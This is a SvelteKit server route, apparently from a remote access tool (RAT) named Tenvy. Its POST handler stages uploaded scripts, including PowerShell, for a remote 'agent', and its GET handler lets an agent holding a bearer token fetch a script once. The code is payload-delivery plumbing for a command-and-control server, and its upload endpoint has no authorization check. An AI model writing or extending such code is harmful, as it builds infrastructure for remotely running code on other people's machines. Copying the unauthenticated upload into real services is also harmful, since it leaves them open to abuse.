import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { optionsScriptManager } from '$lib/server/rat/options-script';
import { registry, RegistryError } from '$lib/server/rat/store';

const MAX_SCRIPT_BYTES = 256 * 1024; // 256 KiB
const ALLOWED_MIME_PREFIXES = ['text/', 'application/json'];
const ALLOWED_MIME_TYPES = new Set(['application/octet-stream', 'application/x-powershell']);

function isMimeTypeAllowed(type: string | undefined): boolean {
	if (!type) {
		return true;
	}
	const normalized = type.trim().toLowerCase();
	if (normalized === '') {
		return true;
	}
	if (ALLOWED_MIME_TYPES.has(normalized)) {
		return true;
	}
	return ALLOWED_MIME_PREFIXES.some((prefix) => normalized.startsWith(prefix));
}

function getBearerToken(header: string | null): string | undefined {
	if (!header) {
		return undefined;
	}
	const match = header.match(/^Bearer\s+(.+)$/i);
	return match?.[1]?.trim();
}

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const form = await request.formData();
	const file = form.get('script');
	if (!(file instanceof File)) {
		throw error(400, 'Script file is required');
	}

	if (typeof file.size === 'number' && file.size > MAX_SCRIPT_BYTES) {
		throw error(413, 'Script exceeds maximum size');
	}

	if (!isMimeTypeAllowed(file.type)) {
		throw error(415, 'Unsupported script media type');
	}

	const buffer = new Uint8Array(await file.arrayBuffer());
	if (buffer.byteLength === 0) {
		throw error(400, 'Script file is empty');
	}
	if (buffer.byteLength > MAX_SCRIPT_BYTES) {
		throw error(413, 'Script exceeds maximum size');
	}

	const record = await optionsScriptManager.stage(id, {
		name: file.name ?? 'script',
		type: file.type || undefined,
		data: buffer
	});

	return json(
		{
			stagingToken: record.token,
			fileName: record.originalName,
			size: record.size,
			type: record.contentType,
			sha256: record.sha256
		},
		{ status: 201 }
	);
};

export const GET: RequestHandler = async ({ params, request, setHeaders }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const url = new URL(request.url);
	const token = url.searchParams.get('token');
	if (!token) {
		throw error(400, 'Missing staging token');
	}

	const bearer = getBearerToken(request.headers.get('authorization'));
	try {
		registry.authorizeAgent(id, bearer);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Agent authorization failed');
	}

	const resolution = await optionsScriptManager.consume(id, token);
	if (!resolution) {
		throw error(404, 'Script staging token not found');
	}

	const { record, data } = resolution;
	const headers: Record<string, string> = {
		'Content-Length': data.byteLength.toString(),
		'Cache-Control': 'no-store',
		'X-Tenvy-Script-Name': record.originalName,
		'X-Tenvy-Script-Size': record.size.toString(),
		'X-Tenvy-Script-Sha256': record.sha256
	};
	if (record.contentType) {
		headers['Content-Type'] = record.contentType;
		headers['X-Tenvy-Script-Type'] = record.contentType;
	} else {
		headers['Content-Type'] = 'application/octet-stream';
	}

	setHeaders(headers);
	return new Response(data);
};
